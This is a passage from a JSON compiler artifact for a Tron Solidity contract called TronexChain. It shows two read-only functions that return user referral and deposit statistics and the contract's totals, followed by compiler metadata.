total_structure, uint256 team_biz, uint256 deposit_payouts) {\r\n        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].team_biz, users[_addr].deposit_payouts);\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw ) {\r\n        return (total_users, total_deposited, total_withdraw );\r\n    }\r\n     \r\n}",
  "sourcePath": "C:/Users/RAAKESH/Desktop/Coding/TronDapp/ATRON RAMESH/contracts/TronexChain.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.4+commit.d15a3125.mod.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2020-10-26T13:42:42.309Z"
}